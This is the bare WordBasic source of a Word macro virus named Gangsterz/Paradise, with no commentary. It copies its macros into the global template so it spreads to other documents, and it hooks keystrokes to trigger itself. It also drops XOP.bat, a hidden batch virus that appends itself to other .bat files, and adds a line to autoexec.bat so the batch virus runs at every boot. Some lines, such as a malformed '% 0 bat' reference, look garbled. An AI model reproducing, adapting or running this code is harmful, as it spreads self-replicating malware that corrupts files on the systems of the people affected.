Sub MAIN
On Error Goto Done

ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = "Gangsterz", .Add, .Context = 0
ToolsCustomizeKeyboard .KeyCode = 69, .Category = 2, .Name = "Paradise", .Add, .Context = 1
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = "Gangsterz", .Add, .Context = 1
ToolsCustomizeKeyboard .KeyCode = 69, .Category = 2, .Name = "Paradise", .Add, .Context = 0

G$ = WindowName$() + ":Gangsterz"
P$ = WindowName$() + ":Paradise"

NJ$ = MacroFileName$("Gangsterz")
F$ = FileNameInfo$(NJ$, 5)

If CheckInstalled = 0 Then
    MacroCopy G$, "Global:Gangsterz", 1
    MacroCopy P$, "Global:Paradise", 1
    FileSaveAll 1, 1
Else
    Goto Done
End If

Done :
A$ = FileName$()
If A$ = "" Then
    Goto Finish
Else
    Insert " "
End If

Finish :
L$ = GetProfileString$("Intl", "XOP")
If L$ = "Installed" Then
    Goto Finito
Else
    Dropper
    SetProfileString "Intl", "XOP", "Installed"
    On Error Goto Finito
    Open "C:\autoexec.bat" For Append As #1
    Print #1, "@echo off"
    Print #1, F$ + "Xop.bat"
    Close #1
End If

Finito :
End Sub

Function CheckInstalled
    CheckInstalled = 0
    If CountMacros(0) > 0 Then
        For i = 1 To CountMacros(0)
            If MacroName$(i, 0) = "Gangsterz" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function

Sub Dropper
    NJ$ = MacroFileName$("Gangsterz")
    F$ = FileNameInfo$(NJ$, 5)
    Open F$ + "XOP.Bat" For Output As #1
    Print #1, "@echo off%[XoP]%"
    Print #1, "if '%XoP%=='11 goto XoP2"
    Print #1, "if '%2=='_ goto XoP1"
    Print #1, "if exist C:\XoP.bat goto XoP"
    Print #1, "if not exist %0.bat goto XoP2"
    Print #1, "find" + Chr$(32) + Chr$(34) + "XoP" + Chr$(34) + " < % 0 bat > C:\XoP.bat "
    Print #1, "attrib C:\XoP.bat +h"
    Print #1, ":XoP"
    Print #1, "for %%v in (*.bat ..\*.bat) do call C:\XoP %%v _"
    Print #1, "set XoP="
    Print #1, "goto XoP2"
    Print #1, ":XoP1"
    Print #1, "find /i" + Chr$(32) + Chr$(34) + "XoP" + Chr$(34) + Chr$(32) + "<%1>nul"
    Print #1, "if not errorlevel 1 goto XoP2"
    Print #1, "type C:\XoP.bat>>%1"
    Print #1, "set XoP=%XoP%1"
    Print #1, ":XoP2"
    Close #1
End Sub